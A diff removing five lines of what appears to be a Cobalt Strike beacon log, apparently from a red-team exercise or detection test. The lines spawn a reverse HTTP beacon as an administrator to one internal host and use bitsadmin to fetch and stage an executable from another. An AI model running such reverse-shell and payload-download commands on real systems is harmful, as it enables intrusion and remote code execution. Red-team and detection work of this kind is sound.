@@ -1,5 +1,0 @@
-02/04 15:08:51 [task] Tasked beacon to spawn windows/beacon_http/reverse_http (172.17.2.56:80) as Administrators\a
-02/04 15:08:51 [task] Tasked beacon to run: bitsadmin /create addfile
-02/04 15:08:51 [task] Tasked beacon to run: bitsadmin /addfile addfile http://172.17.2.57:8080/test_1197.exe  c:\RedTeam\test.exe
-02/04 15:08:51 [task] Tasked beacon to run: bitsadmin /RESUME addfile
-02/04 15:08:51 [task] Tasked beacon to run: bitsadmin /complete addfile
